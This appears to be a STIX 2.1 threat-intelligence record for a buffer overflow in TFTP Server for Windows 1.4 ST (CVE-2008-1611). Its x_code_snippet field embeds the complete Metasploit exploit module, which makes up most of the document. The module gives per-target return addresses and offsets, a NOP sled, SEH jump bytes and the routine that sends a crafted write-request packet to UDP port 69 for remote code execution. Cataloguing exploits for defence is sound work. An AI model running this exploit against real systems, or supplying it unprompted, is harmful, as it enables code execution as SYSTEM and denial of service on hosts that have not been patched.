{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7998d8cb-04e3-4f46-8c44-efbe4ebeede7",
    "created": "2024-08-14T16:50:35.341048Z",
    "modified": "2024-08-14T16:50:35.341052Z",
    "name": "TFTP Server for Windows 1.4 ST WRQ Buffer Overflow",
    "description": " This module exploits a vulnerability found in TFTP Server 1.4 ST.  The flaw is due to the way TFTP handles the filename parameter extracted from a WRQ request. The server will append the user-supplied filename to TFTP server binary's path without any bounds checking, and then attempt to check this path with a fopen(). Since this isn't a valid file path, fopen() returns null, which allows the corrupted data to be used in a strcmp() function, causing an access violation.  Since the offset is sensitive to how the TFTP server is launched, you must know in advance if your victim machine launched the TFTP as a 'Service' or 'Standalone' , and then manually select your target accordingly. A successful attempt will lead to remote code execution under the context of SYSTEM if run as a service, or the user if run as a standalone. A failed attempt will result a denial-of-service. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/tftpserver_wrq_bof.rb",
            "external_id": "tftpserver_wrq_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1611"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'TFTP Server for Windows 1.4 ST WRQ Buffer Overflow',\n      'Description'     => %q{\n          This module exploits a vulnerability found in TFTP Server 1.4 ST.  The flaw\n        is due to the way TFTP handles the filename parameter extracted from a WRQ request.\n        The server will append the user-supplied filename to TFTP server binary's path\n        without any bounds checking, and then attempt to check this path with a fopen().\n        Since this isn't a valid file path, fopen() returns null, which allows the\n        corrupted data to be used in a strcmp() function, causing an access violation.\n\n        Since the offset is sensitive to how the TFTP server is launched, you must know\n        in advance if your victim machine launched the TFTP as a 'Service' or 'Standalone'\n        , and then manually select your target accordingly. A successful attempt will lead\n        to remote code execution under the context of SYSTEM if run as a service, or\n        the user if run as a standalone. A failed attempt will result a denial-of-service.\n      },\n      'Author'          =>\n        [\n          'Mati Aharoni', #Initial discovery, PoC\n          'Datacut'       #Metasploit\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2008-1611' ],\n          [ 'OSVDB', '43785' ],\n          [ 'BID', '18345' ],\n          [ 'EDB', '5314' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' =>'seh',\n        },\n      'Payload'         =>\n        {\n          'Space'           => 600,\n          'BadChars'        => \"\\x00\\x2f\",\n          'StackAdjustment' => -3500\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          # datacut tested ok 19/04/12 on xp sp2 sp3, win 7 sp0 sp1.\n          # possible may work for other service packs and or vista\n          # Rets = P/P/R from tftpserversp.exe\n          [ 'Windows XP SP2/SP3 EN Service Mode',       { 'Ret' => 0x416801 , 'Offset' => 1203} ],\n          [ 'Windows XP SP2/SP3 EN Standalone Mode',    { 'Ret' => 0x416801 , 'Offset' => 1487} ],\n          [ 'Windows 7 SP0/SP1 EN x64 Service Mode',    { 'Ret' => 0x416801 , 'Offset' => 1217} ],\n          [ 'Windows 7 SP0/SP1 EN x64 Standalone Mode', { 'Ret' => 0x416801 , 'Offset' => 1501} ],\n          [ 'Windows 7 SP0/SP1 EN x86 Service Mode',    { 'Ret' => 0x416801 , 'Offset' => 1223} ],\n          [ 'Windows 7 SP0/SP1 EN x86 Standalone Mode', { 'Ret' => 0x416801 , 'Offset' => 1507} ]\n        ],\n      'Privileged'\t=> false,\n      'DisclosureDate'=> '2008-03-26',\n      'DefaultTarget' => 4))  #TFTP is installed as a service\n\n    register_options(\n      [\n        Opt::RPORT(69)\n      ])\n  end\n\n\n  def exploit\n    connect_udp\n\n    nops = make_nops(50)\n    lead = rand_text_alphanumeric(target['Offset'] - payload.encoded.length - nops.length)\n    near = \"\\xe9\\x80\\xfd\\xff\\xff\"    #jump back 640 bytes to the nop sled\n    nseh = \"\\xeb\\xf9\" + make_nops(2) #jump back 7 bytes to the long jump\n\n    evil = lead + nops + payload.encoded + near + nseh + [target.ret].pack('V')\n    mode = \"netascii\"\n\n    #Send the WRQ packet (header \"\\x00\\x02\")\n    sploit = \"\\x00\\x02\" + evil + \"\\0\" + mode +\"\\0\"\n\n    udp_sock.put(sploit)\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-03-26",
    "x_mitre_platforms": [
        "win'"
    ]
}